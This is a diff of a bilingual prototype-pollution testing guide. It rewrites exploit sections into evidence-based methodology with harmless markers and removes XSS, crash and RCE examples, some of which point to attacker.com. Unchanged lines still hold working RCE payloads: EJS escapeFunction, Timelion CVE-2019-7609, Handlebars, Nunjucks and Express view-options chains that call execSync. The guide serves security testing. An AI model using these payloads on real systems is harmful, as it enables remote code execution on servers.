@@ -1,4 +1,4 @@
-> 短表「PP 打到模板 RCE」在后半「来源专题：prototype-pollution-advanced」下，用标题搜即可。主场是 Node 深合并；别的栈 JSON 也能合就仍可探一枪，gadget 对不上丢掉，不是禁打。
+> 短表「PP 打到模板 RCE」在后半「来源专题：prototype-pollution-advanced」下。先确认属性污染及真实消费者，再按版本/配置选择候选；JSON 能合并或出现库名不等于链可达。延迟消费见 [解释执行](el-injection-test.md)。
 
 # prototype-pollution
 
@@ -12,16 +12,11 @@
 ### Client-side first probes
 
 ```text
-#__proto__[polluted]=1
-#__proto__[polluted]=polluted
-#constructor[prototype][polluted]=1
+#__proto__[pp_probe_7f]=marker
+#constructor[prototype][pp_probe_7f]=marker
 ```
 
-When input can reflect into DOM or framework routing, pair with `alert(1)` / `console` checks to observe whether global object properties were polluted.
-
-```text
-#__proto__[xxx]=alert(1)
-```
+Use one unique, harmless marker when a normal operation supports a specific fragment/query parsing and property-write hypothesis. Record that operation under the same identity, then inspect the relevant object/prototype before and after the candidate input in the **same realm**. Text reflection or a console value alone does not identify a prototype write; script execution is a separate consumer question.
 
 ### Server-side first probes（JSON / form）
 
@@ -33,29 +28,31 @@ When input can reflect into DOM or framework routing, pair with `alert(1)` / `co
 {"constructor":{"prototype":{"polluted":true}}}
 ```
 
-After sending, check whether unrelated follow-up responses show abnormal headers/status/JSON spacing, or whether app logic reads `Object.prototype.polluted` (see §3 detection table).
+First locate a reachable parser/merge/assignment and an observation tied to its object or consumer. Compare a normal request, an ordinary-field control and one candidate input under the same identity; a marker echoed as an own field is not shared-prototype pollution. Follow-up responses can test scope only when their consumer and request/worker association are understood (see §3).
 
-### Quick boolean
+### Candidate selection
 
-If target code uses `lodash.merge`, `deep-extend`, `hoek.applyToDefaults`, or some `qs`/`query-string` configurations, **raise priority**.
+Names such as `lodash.merge`, `deep-extend`, `hoek.applyToDefaults`, `qs` or `query-string` help locate code, not rank exploitability. Use actual input handling, controlled differences or available implementation/configuration evidence to form one parser/write hypothesis, then choose a discriminating observation. Source access is not mandatory, but a dependency name or a parsed nested object alone does not establish a prototype write.
 
 ---
 
 ## 1. MECHANISM
 
-**Prototype chain**: when accessing `obj.key`, if `obj` lacks own property `key`, lookup walks up `[[Prototype]]` until `Object.prototype`.
+**Prototype chain**: an ordinary property lookup can follow `[[Prototype]]` when an own property is absent, ending at `null`; not every object chain contains `Object.prototype`. Identify the actual object, own properties and prototype chain before interpreting a result.
 
-**`__proto__`**: many parsers treat literal key `__proto__` as a magic path that attaches child properties to the prototype. Merging `{ "__proto__": { "x": 1 } }` can be equivalent to `Object.prototype.x = 1` depending on implementation and patch level.
+**`__proto__`**: a member produced by ordinary `JSON.parse` is not by itself a prototype write. A later assignment, path traversal or merge may handle that key differently. Distinguish an ordinary data member, a changed prototype of one target object and a write to a shared prototype; do not treat JavaScript object-literal syntax as an interchangeable JSON transport test.
 
-**`constructor.prototype`**: `constructor` typically points to the object's constructor function; `constructor.prototype` is that constructor's prototype object. For plain objects this usually links to `Object.prototype`. Example path:
+**`constructor.prototype`**: a candidate path only if the actual traversal resolves these components to a prototype and permits the write; own fields, path handling and restrictions can prevent that. Example input shape:
 
 ```json
 {"constructor":{"prototype":{"polluted":1}}}
 ```
 
-This is not always equivalent to `__proto__` (filtering, JSON parsing, Bun/Node differences), so **test both paths**.
+This is not equivalent to `__proto__`. Choose between them using evidence about key parsing, filtering and traversal; lack of a signal is not a reason to try both unconditionally.
 
-**Core issue**: this is not just "one extra parameter"; in non-isolated merge logic, attacker-controlled keys point to **prototype objects**, giving **global** or shared template context malicious properties that later code reads normally, triggering gadgets.
+**Core issue**: an uncontrolled prototype write matters when a reachable consumer reads the affected property across a trust boundary. Its scope may be one object, one realm or shared server state; neither a global effect nor a dangerous gadget follows automatically.
+
+2026-11-25 semantic check: [ECMAScript JSON.parse](https://tc39.es/ecma262/multipage/structured-data.html#sec-json.parse). The current specification distinguishes JSON parsing from object-literal evaluation; application revivers/parsers and later writes still require inspection. This is a language reference, not evidence about an installed library or a tested target.
 
 ---
 
@@ -64,53 +61,47 @@ This is not always equivalent to `__proto__` (filtering, JSON parsing, Bun/Node 
 ### URL fragment
 
 ```text
-https://app.example/page#__proto__[admin]=1
+https://app.example/page#__proto__[pp_probe_7f]=marker
 ```
 
-```text
-https://app.example/#__proto__[xxx]=alert(1)
-```
-
-If router or analytics code parses fragments into objects and then merges, pollution may occur.
+Requires the observed router/analytics path to parse this syntax and write the resulting keys. Reflection, an ignored fragment or an ordinary own-field update are competing explanations.
 
 ### `constructor.prototype` path
 
 ```text
-#constructor[prototype][role]=admin
+#constructor[prototype][pp_probe_7f]=marker
 ```
 
 ### DOM / attribute injection ideas
 
-If the framework merges attribute names as object keys:
+If a proven property-writing path feeds a specific DOM configuration reader, `src` is one candidate to trace with an owned harmless resource:
 
 ```text
-__proto__[src]=//evil/xss.js
+__proto__[src]=/owned-test-resource
 ```
 
-Event-handler style keys (implementation-dependent):
+An event-like name such as `onerror` is only another candidate name. Establish whether the consumer accepts the value, reads it as inherited state and assigns/evaluates it; a JSON string does not become a callable merely because of the key name.
 
-```text
-__proto__[onerror]=alert(1)
-```
+**Verification**: capture the marker's property descriptor and the relevant object's prototype before/after the controlled action in the same page realm, distinguishing own-field changes from prototype changes. A new realm is a separate baseline, not a view of the previous realm's memory: absence there does not refute the earlier write, and a repeated effect needs its own input/initialization attribution. Account for frame/worker boundaries, extensions and DevTools writes; do not manually set the prototype and attribute that change to the application.
 
-**Verification**: open a fresh page without fragment and check in console whether test keys remain on `Object.prototype`; account for extension and DevTools interference.
+The [ECMAScript realm model](https://tc39.es/ecma262/multipage/executable-code-and-execution-contexts.html#sec-code-realms) associates intrinsic objects and global state with a realm (checked 2026-11-25). No browser or target scenario was executed here.
 
 ---
 
 ## 3. SERVER-SIDE DETECTION (Express / Node, black-box)
 
-The payloads below assume body/query is deeply parsed into objects by **qs** or similar parsers (possibly with `body-parser`). Observe **global side effects**, not only current endpoint return values.
+For these historical property names, distinguish two hypotheses: input reaches a prototype write, and a later consumer reads that property. Choose an observation that separates the relevant hypothesis from ordinary data/configuration handling; JSON decoding, nested parsing or an Express/Node fingerprint alone proves neither. Keep the experiment harmless and reversible in the permitted environment, with valid normal operation and identity.
 
-| Payload (JSON example) | Expected observable signal |
+| Candidate input | Required read and competing explanation |
 |----------------------|----------------|
-| `{"__proto__":{"parameterLimit":1}}` | Multi-parameter parsing in follow-up requests is ignored or abnormal (`qs`-style `parameterLimit`) |
-| `{"__proto__":{"ignoreQueryPrefix":true}}` | Double-question-mark prefixes like `??foo=bar` are accepted or behavior changes sharply |
-| `{"__proto__":{"allowDots":true}}` | Nested keys like `?foo.bar=baz` are expanded via dot notation |
-| `{"__proto__":{"json spaces":" "}}` | JSON-serialized responses gain extra spaces (`JSON.stringify` spacing setting polluted) |
-| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS responses include `foo`-related headers (if framework reads config from prototype) |
-| `{"__proto__":{"status":510}}` | Some response status changes to 510 or another abnormal code (app reads `status` from object) |
+| `{"__proto__":{"parameterLimit":1}}` | Does the actual parser read an inherited limit? Existing limits, rejection and body format can also drop parameters. |
+| `{"__proto__":{"ignoreQueryPrefix":true}}` | Does this parser consume that option? Prefix handling may be normal parsing behavior. |
+| `{"__proto__":{"allowDots":true}}` | Does an inherited option affect this parser call? Dot expansion may already be configured or performed by another layer. |
+| `{"__proto__":{"json spaces":" "}}` | Does this serializer integration read the property? Formatting may come from fixed settings, another worker or a proxy. |
+| `{"__proto__":{"exposedHeaders":["foo"]}}` | Does this CORS consumer read an inherited configuration? Normal CORS policy or direct header reflection can explain the response. |
+| `{"__proto__":{"status":510}}` | Does this error/response path read the affected property? Validation errors or explicitly copied status fields are alternative causes. |
 
-**Operational tip**: send pollution request first, then a **clean** request to observe persistence; connection pools and worker lifecycle affect whether impact is globally visible.
+**Observation order**: normal request → one candidate → the same normal request/consumer, with request IDs and identity recorded. A clean follow-up can expose an effect but does not identify its cause alone. Workers, caches and shared configuration are competing explanations; connection reuse does not establish a shared worker. Stop at a specific blocker if the observation cannot be associated. A changed header/spacing/status is mechanism evidence at most until an actual trust-boundary impact is shown.
 
 ---
 
@@ -119,11 +110,11 @@ The payloads below assume body/query is deeply parsed into objects by **qs** or 
 | Target / scenario | Payload or pattern | Notes |
 |-------------|------------|------|
 | **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | If template engine options like `escapeFunction` are read from polluted prototype, this may lead to RCE; strongly version/config dependent |
-| **Timelion expression chain (CVE-2019-7609)** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | Historical chain: prototype pollution + timeline expression execution; useful to understand **expression + PP** combinations |
-| **Node `child_process`** | Pollute `shell`, `argv0`, `env`, `NODE_OPTIONS`, etc. (merged into `exec`/`fork` option objects) | Depends on whether later code calls `spawn`/`fork` and reads options from prototype chain |
-| **Generic constructor path** | `{"constructor":{"prototype":{"foo":"bar"}}}` | Bypasses weak validation that filters only the `__proto__` key |
+| **Timelion expression chain (CVE-2019-7609)** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | Imported historical expression/PP candidate; actual plugin/version, property propagation and consumer remain prerequisites, not a compatibility promise |
+| **Node `child_process`** | Candidate fields `shell`, `argv0`, `env`, `NODE_OPTIONS`, etc. | Trace actual option construction and the selected child-process call; see the runtime/configuration conditions below |
+| **Generic constructor path** | `{"constructor":{"prototype":{"foo":"bar"}}}` | Alternative only if the parser/traversal accepts this path and reaches a prototype; filtering one key does not prove the alternative works |
 
-**Chain mindset**: pollution -> dependency reads `obj.settings.xxx` without `hasOwnProperty` -> RCE / SSRF / path traversal.
+**Chain evidence**: input → specific prototype write → reachable inherited-property read → bounded observed effect. Missing own-property checks alone do not establish RCE, SSRF or path traversal; the value and consumer must support that effect.
 
 ---
 
@@ -145,34 +136,19 @@ Prioritize use on **authorized** targets; automated tools can cause side effects
 ## 6. DECISION TREE
 
 ```
-                    Input merged into nested object?
-                    (query, JSON, GraphQL vars, YAML→JSON)
-                                |
-               NO --------------+-------------- YES
-               |                              |
-        Other vuln class                Parser allows __proto__ /
-                                        constructor.prototype keys?
-                                                    |
-                                    NO --------------+-------------- YES
-                                    |                              |
-                             Check unicode /                    Confirm global effect:
-                             bypass of key names               clean follow-up request
-                                    |                              |
-                                    +--------------+----------------+
-                                                   |
-                                                   v
-                                    Gadget present? (template, spawn, JSON.stringify opts, CORS)
-                                                   |
-                              NO ------------------+------------------ YES
-                              |                                         |
-                       Report PP as DoS /              Build minimal RCE or
-                       logic impact                   high-impact PoC
-                              |                                         |
-                              +---------------------+-------------------+
-                                                    |
-                                                    v
-                              Client-side: fragment / DOM / third-party script
-                              Server-side: qs/body-parser/lodash/deep-merge version audit
+Normal operation and identity valid?
+├── NO → repair baseline / record blocker; not a mechanism negative
+└── YES → input reaches a specific property-writing path?
+    ├── UNKNOWN → locate parser, traversal and target object
+    └── YES → distinguish own field / one-object prototype / shared prototype
+        ├── Only reflection, error or unknown scope → discriminate before concluding
+        └── Controlled prototype difference established
+            ├── No reachable consumer → retain fact + consumer blocker
+            └── Consumer reads the changed property
+                ├── Normal feature / formatting only → no assumed security impact
+                └── One bounded effect test + ordinary/non-triggered controls
+                    → conclude only the observed trust-boundary impact
+                      No automatic DoS, logic-impact or RCE report from PP alone
 ```
 
 ---
@@ -184,82 +160,51 @@ Prioritize use on **authorized** targets; automated tools can cause side effects
 
 ### PP 打到模板 RCE（短表有指针）
 
-认：Node / Express；JSON 或 query 能把 `__proto__` / `constructor.prototype` 写进去（先用 `{"__proto__":{"pptest123":"1"}}`，干净请求还看得到副作用）；后面有 `res.render`、EJS、Pug、Handlebars，或会 `child_process.spawn`。
+认：已证实服务端属性/原型污染，并有具体模板、配置或子进程消费者读取该属性的证据。记录写入身份、属性、生命周期、消费者版本/配置、触发动作与结果；Node/Express 指纹或出现 `res.render` 不能替代这条链。
 
 打：
 
-1. 污染通了再打 gadget，不要一上来喷 RCE 串。
-2. EJS：`outputFunctionName` 注入；Pug：`block.type` + `val`；拦 `__proto__` 就换 `constructor.prototype`。
-3. 没有模板再试 `shell` + `NODE_OPTIONS`。命令用 `echo 标记 && id`，不要反弹。
+1. 在获准受控环境确认无害属性差分，区分普通字段写入、实例原型变化与共享原型污染；观察范围和持久性，及时清理。
+2. 沿实际属性读取查消费者：自己的属性、继承属性、默认值与空原型/复制行为不同。核对精确版本、选项、编译/缓存路径；用普通值与无触发对象区分“已写入”与“已消费”。
+3. 只有消费者和危险调用前提成立，才选一条有界、非破坏性的效果验证。缺模板/子进程消费者即 blocker，不顺序轮换 EJS/Pug/`NODE_OPTIONS`。延迟触发按 [解释执行](el-injection-test.md) 的保存→触发→观察关联。
 
-算成：下一次模板渲染或 spawn 后，回包/日志出现指定标记或 `uid=`。只污染成功、命令没跑 → 还没成。
+算成：将本次属性变化、实际触发和结果关联，并用普通值/未触发对照证明结果来自对应危险调用，而非原样回显、旧日志或缓存。标记或 `uid=` 字样本身不证明命令执行；只证实污染时保留为事实，按实际危害与标准卡收取，不补报 DoS/逻辑漏洞。
 
-假点：只能改前端展示；没有模板/spawn gadget；污染一请求就没了、下一次 render 不跟。单站没中不删短表这行。Node 深合并优先开 gadget；别的栈合得进也可以探，对不上丢掉。
+反例/缺口：只有展示变化不能证明服务端执行；没有对应消费者、配置不读取或版本不适用时不能沿旧链推断；请求后消失只限定生命周期，仍须区分同请求是否消费；渲染未运行或命中旧缓存则观察尚不完整。源码可达只缩小假设，不能代替本次触发效果。
 
-gadget 表和 payload 见下面英文段 + 附件 KNOWN_GADGETS。
+下面及附件保留历史候选机制，不提供“库名→必成链”或成功率排名。路线与停止见 [技术路线研究](../rules/technical-route-research.md)。
 
 ## 1. SERVER-SIDE PP → RCE
 
 ### 1.1 Node.js child_process.spawn — Shell/ENV Injection
 
-When `child_process.spawn` or `child_process.fork` is called without explicit `env`/`shell` options, it inherits from `Object.prototype`:
+Historical candidate: a polluted option may influence a reachable child-process call. First establish the exact runtime, option construction/own-property handling, platform and trigger; absence of explicit options alone does not prove inherited control or execution.
 
-```javascript
-// Vulnerable pattern (very common):
-const { execSync } = require('child_process');
-execSync('ls');  // inherits shell, env from prototype
+Track `shell`, `env`, `argv0`, `execArgv` or other candidate options only when the application demonstrably propagates them to that call. Distinguish a top-level option from an environment entry, and inherited state from values copied by the application into own properties. A file-based candidate also needs a controlled readable file and an applicable runtime/platform; `/proc` paths are not portable.
 
-// Pollution for RCE:
-Object.prototype.shell = '/proc/self/exe';
-Object.prototype.argv0 = 'console.log(require("child_process").execSync("id").toString())//';
-Object.prototype.NODE_OPTIONS = '--require /proc/self/cmdline';
-// Next child_process call executes attacker code
-```
-
-Alternative ENV pollution:
-
-```json
-{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
-```
+2026-11-25 source check: [Node child-process API](https://nodejs.org/api/child_process.html) and [current main source](https://github.com/nodejs/node/blob/main/lib/child_process.js). The inspected `normalizeSpawnArguments` copies `options = { __proto__: null, ...options };`; `fork` has its own option normalization. This refutes an unconditional “missing options inherits the prototype and executes” rule, not every possible application-level propagation. Main is mutable and not a target version; no target or representative local application was tested.
 
 ### 1.2 EJS (Embedded JavaScript Templates)
 
-EJS `render()` reads `opts` from object properties. Polluting `outputFunctionName` injects code into the compiled template function:
+`outputFunctionName` is a historical option-to-generated-source candidate, not an all-version chain. The official EJS v3.1.10 source checks it against a JavaScript identifier pattern and throws `outputFunctionName is not a valid JS identifier.` for invalid names; it also validates `destructuredLocals`. A library fingerprint or a merge alone therefore cannot establish code injection. Trace the actual option-copying, validation and compilation path before choosing a probe.
 
-```json
-// Pollution payload:
-{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
-
-// When EJS renders ANY template after pollution:
-// Compiled function includes: var x;process.mainModule.require('child_process').execSync('id');s = "";
-// → RCE
-```
-
-Detection: any EJS `res.render()` call after pollution triggers it.
+2026-11-25 source check: [EJS v3.1.10 compiler](https://github.com/mde/ejs/blob/v3.1.10/lib/ejs.js). This pinned version is a counterexample to the old “all versions” claim, not a claim that every other option/version is safe. No target or representative local application was tested.
 
 ### 1.3 Pug (formerly Jade)
 
-Pug's compiler reads `block` from object properties:
+`block`, node `type`/`val`, `self` and debug metadata are historical candidates for studying AST/option consumption. Distinguish text buffering from code generation, own fields from inherited defaults, and a normal compile error from a dangerous effect. Do not assume that an arbitrary `Text.val` is emitted as executable JavaScript.
 
-```json
-{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
-```
-
-Alternative via `self` option:
-
-```json
-{"__proto__": {"self": true, "line": "x]});process.mainModule.require('child_process').execSync('id');//"}}
-```
+2026-11-25 source check: [Pug code generator](https://github.com/pugjs/pug/blob/master/packages/pug-code-gen/index.js), mutable master with distinct node visitors (`visitText` calls `buffer`). This only identifies the code path to inspect; target release, parser/transforms, options and inherited reads remain unverified. No target or representative local application was tested.
 
 ### 1.4 Handlebars
 
-Handlebars template compilation checks `type` and `program` on template AST nodes:
+Historical AST/option candidates for Handlebars; first prove that the exact installed compiler or runtime reads the controlled properties in this call:
 
 ```json
 {"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "PathExpression", "original": "constructor.constructor('return process.mainModule.require(`child_process`).execSync(`id`)')()","parts": ["constructor","constructor"]}, "params": [], "hash": null}]}}
 ```
 
-Simpler via `allowProtoMethodsByDefault`:
+Another historical option candidate (not a bypass guarantee):
 
 ```json
 {"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}
@@ -268,13 +213,15 @@ Simpler via `allowProtoMethodsByDefault`:
 
 ### 1.5 Nunjucks
 
+Historical AST candidate; requires a reachable compiler/transform consuming these properties. A loaded Nunjucks dependency is insufficient.
+
 ```json
 {"__proto__": {"type": "Code", "value": "global.process.mainModule.require('child_process').execSync('id')"}}
 ```
 
 ### 1.6 Express res.render (Generic)
 
-When Express calls `res.render()`, options merge with `app.locals` and `res.locals`. Polluted prototype properties appear as template variables:
+For an Express render path, trace how the actual view engine receives locals and options and whether inherited properties survive. The historical `view options` candidate below is not generic across engine, integration or version:
 
 ```json
 {"__proto__": {"view options": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}}
@@ -286,51 +233,44 @@ When Express calls `res.render()`, options merge with `app.locals` and `res.loca
 
 ### 2.1 jQuery Gadgets
 
-`$.extend(true, {}, userInput)` performs deep merge — classic PP sink.
+`$.extend(true, {}, userInput)` is a historical merge candidate, not proof of a vulnerable installed implementation. First trace the accepted keys, actual target and prototype changes. Then independently locate an inherited-property read in the application's DOM integration; a jQuery dependency or an HTML method name is insufficient.
 
-After pollution, jQuery's HTML methods use polluted properties:
-
-```javascript
-// Pollution:
-Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
-
-// Trigger: any jQuery DOM manipulation that reads innerHTML from prototype
-$('<div>').appendTo('body');  // may use polluted property
+```json
+{"__proto__":{"pp_probe_7f":"marker"}}
 ```
+
+This preserves the candidate input shape for a harmless write observation. `innerHTML`/`src` are downstream candidate names only after the actual configuration read is found; element creation or `appendTo` does not by itself prove either is read from the polluted prototype.
 
 ### 2.2 Lodash Gadgets
 
 ```javascript
-// Vulnerable functions (deep merge):
+// Candidate calls to inspect in the actual installed implementation:
 _.merge({}, userInput)
 _.defaultsDeep({}, userInput)
-_.set(obj, path, value)  // if path is attacker-controlled
-
-// template() gadget:
-Object.prototype.sourceURL = '\u000ajavascript:alert(1)//';
-_.template('hello')();  // sourceURL injected into Function constructor
+_.set(obj, path, value)  // establish accepted path and actual write target
 ```
+
+`_.template` and `sourceURL` are historical consumer candidates, not a guaranteed next step from a merge. Determine whether the current options construction reads the inherited value and how validation/code generation handles it. A harmless marker in metadata or output is not execution; the attachment retains the historical construction for applicability review.
 
 ### 2.3 Script Gadgets in Frameworks
 
-"Script gadgets" are framework code paths that read from `Object.prototype` and perform dangerous operations:
+These imported names are lookup leads for actual application code, not verified framework-wide gadgets. Require a property write, an inherited read and the specific unsafe use; data binding or a documented template feature may explain the same visible output.
 
-| Framework | Gadget Pattern | Polluted Property | Impact |
+| Historical context | Consumer to locate | Candidate property | Evidence still required |
 |---|---|---|---|
-| jQuery | `$.html()`, element creation | `innerHTML`, `src` | XSS |
-| Angular.js | `$interpolate` | `__defineGetter__` | XSS |
-| Vue.js | Template compilation | `template`, `render` | XSS |
-| Ember.js | Component rendering | Various view properties | XSS |
-| Backbone.js | `_.template` | `sourceURL` | XSS |
+| jQuery | Application DOM integration | `innerHTML`, `src` | Actual inherited read and unsafe DOM use, not just element creation |
+| Angular.js | Interpolation/compilation path | `__defineGetter__` | Actual use of the property and a boundary crossed, not a name match |
+| Vue.js | Component/template path | `template`, `render` | Compiler/runtime mode, accepted value type and reachable use |
+| Ember.js | Component rendering | Specific view property found in code | Exact read and output origin; no generic gadget assumed |
+| Backbone.js | Application template integration | `sourceURL` | Actual option propagation and generated result |
 
 ### 2.4 DOM Property Pollution
 
-```javascript
-Object.prototype.src = 'https://attacker.com/evil.js';
-Object.prototype.href = 'javascript:alert(1)';
-Object.prototype.action = 'https://attacker.com/phish';
-// Any dynamically created element may inherit these
+```json
+{"__proto__":{"src":"/owned-test-resource"}}
 ```
+
+`src`, `href` and `action` remain candidate names for a **specific** configuration-to-element path. Inspect which object supplies the value and whether an own property, accessor, default or filtering prevents the hypothesized inherited read. An arbitrary property on `Object.prototype` does not imply every newly created DOM element consumes it. Use an owned inert destination to observe the selected path; URL assignment alone does not prove script execution or a different identity's impact.
 
 ---
 
@@ -338,41 +278,22 @@ Object.prototype.action = 'https://attacker.com/phish';
 
 ### 3.1 Black-Box Server-Side Detection
 
-```
-Step 1: Inject and check
-  POST /api/endpoint
-  {"__proto__":{"polluted":"yes"}}
-  
-  Then: GET /api/anything
-  Check if response contains "polluted" or behavior changes
-
-Step 2: Error-based detection
-  {"__proto__":{"toString":1}}
-  → If server crashes or returns 500, toString was overwritten
-  
-  {"__proto__":{"valueOf":1}}
-  → Same crash-based detection
-
-Step 3: Response differential
-  {"__proto__":{"status":555}}
-  → Check if HTTP status code changes to 555
-  
-  {"__proto__":{"content-type":"text/plain"}}
-  → Check if Content-Type header changes
-```
+1. Establish a normal operation, valid identity and a known observation endpoint/consumer. Use one unique harmless marker at the identified input position to test a specific parser/write hypothesis; compare an ordinary-field input and an unchanged request. A field reflected in the response may be ordinary data, not pollution.
+2. Associate the changed behavior with the property write and consumer. For `status` or `content-type` candidates, compare raw responses and inspect whether the consumer reads inherited state, an explicitly copied field or fixed configuration. Do not select an arbitrary `/api/anything` and infer shared state from its error.
+3. Historical `{"__proto__":{"toString":1}}` / `{"__proto__":{"valueOf":1}}` constructions can disrupt common methods and are not default probes. Consider them only in an explicitly permitted isolated, recoverable setting with a relevant read. A 500/crash is consistent with validation, a type mismatch, normal error handling or another failure; it does **not** prove that either prototype method was overwritten. Prefer harmless property/consumer observations; if the cause cannot be distinguished, record that uncertainty rather than a DoS or PP finding.
 
 ### 3.2 Black-Box Client-Side Detection
 
 ```javascript
-// In browser console after interacting with the app:
-Object.prototype.testPollution
-// If returns a value → something polluted the prototype
-
-// Automated: override defineProperty to detect writes
-Object.defineProperty(Object.prototype, '__proto__', {
-    set: function(v) { console.trace('PP detected!', v); }
-});
+// In the application's same realm, before the controlled action:
+const probeKey = 'pp_probe_7f';  // use a unique marker absent in the baseline
+const before = Object.getOwnPropertyDescriptor(Object.prototype, probeKey);
+// Invoke the permitted input/consumer path, without writing the prototype in console.
+const after = Object.getOwnPropertyDescriptor(Object.prototype, probeKey);
+// Compare before/after and the actual application's object/prototype as well.
 ```
+
+This observes only this realm's `Object.prototype`; absence there does not exclude a changed instance/custom prototype. A pre-existing descriptor or a changed value without an attributable input is not confirmation. Preserve the normal/ordinary-field control, execution context and descriptor provenance. Use a debugger at the actual write/read when available; replacing the built-in `__proto__` setter changes behavior and is not a transparent detector for all prototype writes.
 
 ### 3.3 Automated Tools
 
@@ -385,19 +306,23 @@ Object.defineProperty(Object.prototype, '__proto__', {
 
 ---
 
-## 4. BYPASS `__proto__` FILTERS
+## 4. ALTERNATIVE PATH HYPOTHESES
+
+Select an alternative only when parser/filter/traversal evidence predicts a different result. A rejected candidate does not justify spraying every syntax below; each change needs an observable distinction and a bounded stop condition.
 
 ### 4.1 constructor.prototype Path
 
 ```json
-// Instead of:
+// Candidate A, when this key reaches a write:
 {"__proto__": {"polluted": "yes"}}
 
-// Use:
+// Candidate B, only when traversal resolves this alternative path:
 {"constructor": {"prototype": {"polluted": "yes"}}}
 ```
 
 ### 4.2 Bracket Notation Variants
+
+Requires this query parser to interpret brackets/nesting; the last shape additionally requires observed one-pass stripping before a later parse.
 
 ```
 ?constructor[prototype][polluted]=yes
@@ -407,6 +332,8 @@ Object.defineProperty(Object.prototype, '__proto__', {
 
 ### 4.3 JSON Key Variations
 
+These are distinct keys until the actual downstream transformation proves otherwise. A null character or spelling variation is not automatically an alias for `__proto__`.
+
 ```json
 {"__proto__": {"a": 1}}
 {"constructor": {"prototype": {"a": 1}}}
@@ -415,33 +342,30 @@ Object.defineProperty(Object.prototype, '__proto__', {
 
 ### 4.4 Key Distinction: Shallow vs Deep
 
-`Object.assign` does NOT pollute prototype (shallow copy, safe). Only recursive/deep merge functions are vulnerable. Always verify the merge depth.
+Shallow versus deep describes copying, not a security verdict. `Object.assign` uses a property `Set` on the target; an applicable target setter can matter without recursive merging. Distinguish changing that target's prototype from writing to a shared `Object.prototype`, and inspect subsequent reads. Conversely, a deep merge that rejects the relevant path is not vulnerable merely because it is recursive.
+
+2026-11-25 semantic check: [ECMAScript Object.assign](https://tc39.es/ecma262/multipage/fundamental-objects.html#sec-object.assign) and the [legacy `__proto__` accessor](https://tc39.es/ecma262/multipage/fundamental-objects.html#sec-object.prototype.__proto__). The accessor's presence/handling is a premise, not assumed for every runtime or object. These specification references correct the unconditional shallow-copy claim; no target/library application was tested.
 
 ---
 
 ## 5. EXPLOITATION FLOW
 
 ```
-1. Find merge sink (prototype-pollution-test.md Section 0)
-   └── JSON body parsed and deep-merged into server object
+1. Locate an actual property-writing path (first topic, Section 0)
+   └── Trace controlled keys through parsing, traversal/assignment and target identity
 
 2. Confirm pollution:
-   └── {"__proto__":{"testxyz":"1"}} → check if testxyz appears globally
+   └── Unique harmless input + normal control → identify the changed object/prototype
 
-3. Identify technology stack:
-   ├── Express + EJS → outputFunctionName gadget (Section 1.2)
-   ├── Express + Pug → block gadget (Section 1.3)
-   ├── Express + Handlebars → type/program gadget (Section 1.4)
-   ├── Any Node.js with child_process → shell/NODE_OPTIONS (Section 1.1)
-   ├── Client-side jQuery → DOM gadgets (Section 2.1)
-   ├── Client-side Lodash → template/sourceURL (Section 2.2)
-   └── Unknown → try KNOWN_GADGETS.md systematically
+3. Trace one actual property consumer, its version/configuration and trigger
+   ├── Server template/compiler → Section 1, then save/trigger/observe
+   ├── Child-process call → inspect actual option handling and runtime
+   ├── Client DOM/template → Section 2; keep client/server effects distinct
+   └── Unknown consumer → record the missing prerequisite, not a gadget sweep
 
-4. Craft RCE/XSS payload matching gadget
-
-5. Verify with safe payload first (sleep / DNS callback)
-
-6. Escalate to full RCE
+4. Choose one bounded differential experiment with a non-triggered control
+5. Attribute the observed effect to this property, trigger and consumer
+6. Stop at the supported impact or blocker; a callback alone is not RCE
 ```
 
 ---
@@ -455,65 +379,40 @@ Confirmed prototype pollution?
 │   │
 │   ├── SERVER-SIDE
 │   │   ├── Template engine in use?
-│   │   │   ├── EJS → __proto__.outputFunctionName (Section 1.2)
-│   │   │   ├── Pug → __proto__.block (Section 1.3)
-│   │   │   ├── Handlebars → __proto__.type (Section 1.4)
-│   │   │   ├── Nunjucks → __proto__.type (Section 1.5)
-│   │   │   └── Unknown → try each gadget from KNOWN_GADGETS.md
+│   │   │   ├── Known engine → inspect exact option/AST read and version (Section 1)
+│   │   │   └── Unknown → locate the consumer or record blocker
 │   │   │
-│   │   ├── child_process used anywhere?
-│   │   │   ├── YES → __proto__.shell + NODE_OPTIONS (Section 1.1)
-│   │   │   └── MAYBE → inject and trigger error to reveal stack
+│   │   ├── Reachable child_process call consumes a controlled option?
+│   │   │   ├── YES → inspect runtime/platform and design one bounded test
+│   │   │   └── UNKNOWN → collect call/option evidence, not blind option injection
 │   │   │
-│   │   └── No known gadget?
-│   │       ├── Try status code pollution: __proto__.status = 555
-│   │       ├── Try header pollution: __proto__.content-type
-│   │       └── Check KNOWN_GADGETS.md for framework match
+│   │   └── No known consumer?
+│   │       └── Retain the property-write fact and consumer blocker
+│   │           Status/header candidates require a known read, not an automatic fallback
 │   │
 │   └── CLIENT-SIDE
-│       ├── jQuery loaded?
-│       │   ├── YES → $.extend deep merge + DOM gadgets (Section 2.1)
-│       │   └── Check ppmap for automated gadget detection
-│       │
-│       ├── Lodash loaded?
-│       │   ├── YES → _.template sourceURL gadget (Section 2.2)
-│       │   └── _.merge as both sink AND gadget
-│       │
-│       └── Framework (Angular/Vue/Ember)?
-│           └── Script gadget lookup (Section 2.3)
+│       ├── Actual jQuery/Lodash writing path → identify changed object in the same realm
+│       ├── Actual DOM/template consumer → inspect property read and supported value type
+│       └── Only library name / no consumer → locate evidence, not a gadget sweep
 │
 ├── __proto__ keyword filtered?
-│   ├── Try constructor.prototype (Section 4.1)
-│   ├── Try bracket notation (Section 4.2)
-│   └── Try JSON key variations (Section 4.3)
+│   └── Alternative path only if parser/filter evidence predicts a distinction (Section 4)
 │
 └── Not confirmed yet?
